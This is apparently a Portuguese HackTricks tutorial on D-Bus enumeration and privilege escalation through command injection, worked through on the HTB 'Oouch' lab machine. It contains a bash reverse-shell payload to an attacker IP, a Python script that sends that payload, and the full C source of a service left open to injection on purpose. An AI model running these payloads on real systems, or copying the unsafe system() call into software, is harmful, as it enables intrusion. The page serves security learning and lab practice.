# Enumeração e Injeção de Comandos de Privilégio D-Bus

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>

## **Enumeração GUI**

O D-Bus é utilizado como mediador de comunicações entre processos (IPC) em ambientes de desktop Ubuntu. No Ubuntu, a operação concorrente de vários barramentos de mensagens é observada: o barramento do sistema, principalmente utilizado por **serviços privilegiados para expor serviços relevantes em todo o sistema**, e um barramento de sessão para cada usuário logado, expondo serviços relevantes apenas para aquele usuário específico. O foco aqui é principalmente no barramento do sistema devido à sua associação com serviços em execução com privilégios mais elevados (por exemplo, root), uma vez que nosso objetivo é elevar privilégios. Observa-se que a arquitetura do D-Bus emprega um 'roteador' por barramento de sessão, que é responsável por redirecionar mensagens de clientes para os serviços apropriados com base no endereço especificado pelos clientes para o serviço com o qual desejam se comunicar.

Os serviços no D-Bus são definidos pelos **objetos** e **interfaces** que eles expõem. Os objetos podem ser comparados a instâncias de classe em linguagens de programação orientadas a objetos padrão, sendo cada instância identificada de forma única por um **caminho do objeto**. Este caminho, semelhante a um caminho de sistema de arquivos, identifica de forma única cada objeto exposto pelo serviço. Uma interface chave para fins de pesquisa é a interface **org.freedesktop.DBus.Introspectable**, apresentando um método singular, Introspect. Este método retorna uma representação XML dos métodos suportados pelo objeto, sinais e propriedades, com foco aqui nos métodos, omitindo propriedades e sinais.

Para a comunicação com a interface D-Bus, foram utilizadas duas ferramentas: uma ferramenta CLI chamada **gdbus** para invocação fácil de métodos expostos pelo D-Bus em scripts, e [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), uma ferramenta GUI baseada em Python projetada para enumerar os serviços disponíveis em cada barramento e exibir os objetos contidos em cada serviço.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


Na primeira imagem, são mostrados os serviços registrados com o barramento do sistema D-Bus, com **org.debin.apt** especificamente destacado após selecionar o botão do Barramento do Sistema. O D-Feet consulta este serviço para objetos, exibindo interfaces, métodos, propriedades e sinais para os objetos escolhidos, vistos na segunda imagem. A assinatura de cada método também é detalhada.

Um recurso notável é a exibição do **ID do processo (pid)** e da **linha de comando** do serviço, útil para confirmar se o serviço é executado com privilégios elevados, importante para a relevância da pesquisa.

**O D-Feet também permite a invocação de métodos**: os usuários podem inserir expressões em Python como parâmetros, que o D-Feet converte em tipos D-Bus antes de passar para o serviço.

No entanto, observe que **alguns métodos exigem autenticação** antes de nos permitir invocá-los. Vamos ignorar esses métodos, já que nosso objetivo é elevar nossos privilégios sem credenciais em primeiro lugar.

Também observe que alguns dos serviços consultam outro serviço D-Bus chamado org.freedeskto.PolicyKit1 para saber se um usuário deve ser autorizado a realizar certas ações ou não.

## **Enumeração de Linha de Comando**

### Listar Objetos de Serviço

É possível listar as interfaces D-Bus abertas com:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Conexões

[Da Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Quando um processo estabelece uma conexão com um barramento, o barramento atribui à conexão um nome especial de barramento chamado _nome de conexão único_. Nomes de barramento desse tipo são imutáveis — é garantido que não mudarão enquanto a conexão existir — e, mais importante, não podem ser reutilizados durante a vida útil do barramento. Isso significa que nenhuma outra conexão com esse barramento terá atribuído um nome de conexão único, mesmo que o mesmo processo feche a conexão com o barramento e crie uma nova. Nomes de conexão únicos são facilmente reconhecíveis porque começam com o caractere de dois pontos — caso contrário proibido.

### Informações do Objeto de Serviço

Em seguida, você pode obter algumas informações sobre a interface com:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Listar Interfaces de um Objeto de Serviço

Você precisa ter permissões suficientes.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspecionar Interface de um Objeto de Serviço

Observe como neste exemplo foi selecionada a última interface descoberta usando o parâmetro `tree` (_ver seção anterior_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Observe o método `.Block` da interface `htb.oouch.Block` (a que estamos interessados). O "s" das outras colunas pode significar que está esperando uma string.

### Interface de Monitoramento/Captura

Com privilégios suficientes (apenas os privilégios `send_destination` e `receive_sender` não são suficientes) você pode **monitorar uma comunicação D-Bus**.

Para **monitorar** uma **comunicação** você precisará ser **root**. Se ainda tiver problemas para ser root, verifique [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) e [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Se você souber como configurar um arquivo de configuração do D-Bus para **permitir que usuários não root espiem** a comunicação, por favor, **entre em contato comigo**!
{% endhint %}

Diferentes maneiras de monitorar:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
No exemplo a seguir, a interface `htb.oouch.Block` é monitorada e **a mensagem "**_**lalalalal**_**" é enviada por meio de uma má comunicação**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Pode usar `capture` em vez de `monitor` para salvar os resultados em um arquivo pcap.

#### Filtrando todo o ruído <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Se houver muita informação no barramento, passe uma regra de correspondência da seguinte forma:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Múltiplas regras podem ser especificadas. Se uma mensagem corresponder a _qualquer_ das regras, a mensagem será impressa. Como abaixo:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Consulte a [documentação do D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) para obter mais informações sobre a sintaxe da regra de correspondência.

### Mais

`busctl` tem ainda mais opções, [**encontre todas elas aqui**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Cenário Vulnerável**

Como usuário **qtc dentro do host "oouch" do HTB**, você pode encontrar um **arquivo de configuração D-Bus inesperado** localizado em _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Observe da configuração anterior que **você precisará ser o usuário `root` ou `www-data` para enviar e receber informações** por meio dessa comunicação D-BUS.

Como usuário **qtc** dentro do contêiner docker **aeb4525789d8**, você pode encontrar algum código relacionado ao dbus no arquivo _/code/oouch/routes.py._ Este é o código interessante:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Como pode ver, está **conectando a uma interface D-Bus** e enviando para a função **"Block"** o "client\_ip".

Do outro lado da conexão D-Bus, há um binário compilado em C em execução. Este código está **ouvindo** a conexão D-Bus **para o endereço IP e está chamando o iptables via função `system`** para bloquear o endereço IP fornecido.\
**A chamada para `system` é vulnerável de propósito à injeção de comandos**, então um payload como o seguinte criará um shell reverso: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Explorar

No final desta página, você pode encontrar o **código C completo da aplicação D-Bus**. Dentro dele, entre as linhas 91-97, você pode ver como o **`caminho do objeto D-Bus`** e o **`nome da interface`** são **registrados**. Essas informações serão necessárias para enviar informações para a conexão D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Também, na linha 57, você pode encontrar que **o único método registrado** para esta comunicação D-Bus é chamado `Block`(_**Por isso, na próxima seção, os payloads serão enviados para o objeto de serviço `htb.oouch.Block`, a interface `/htb/oouch/Block` e o nome do método `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

O seguinte código Python enviará a carga útil para a conexão D-Bus para o método `Block` via `block_iface.Block(runme)` (_observe que foi extraído do trecho de código anterior_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl e dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` é uma ferramenta usada para enviar mensagens para o "Message Bus".
* Message Bus - Um software usado por sistemas para facilitar a comunicação entre aplicativos. Está relacionado com a Fila de Mensagens (as mensagens são ordenadas em sequência), mas no Message Bus as mensagens são enviadas em um modelo de assinatura e também são muito rápidas.
* A tag "-system" é usada para mencionar que é uma mensagem do sistema, não uma mensagem de sessão (por padrão).
* A tag "--print-reply" é usada para imprimir nossa mensagem adequadamente e receber quaisquer respostas em um formato legível para humanos.
* "--dest=Dbus-Interface-Block" - O endereço da interface Dbus.
* "--string:" - Tipo de mensagem que gostaríamos de enviar para a interface. Existem vários formatos para enviar mensagens como double, bytes, booleans, int, objpath. Dentre esses, o "objeto de caminho" é útil quando queremos enviar o caminho de um arquivo para a interface Dbus. Podemos usar um arquivo especial (FIFO) nesse caso para passar um comando para a interface com o nome de um arquivo. "string:;" - Isso é para chamar o caminho do objeto novamente onde colocamos o arquivo de shell reverso FIFO.

_Obs: Em `htb.oouch.Block.Block`, a primeira parte (`htb.oouch.Block`) faz referência ao objeto de serviço e a última parte (`.Block`) faz referência ao nome do método._

### Código C

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

# Referências
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe seus truques de hacking enviando PRs para os repositórios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
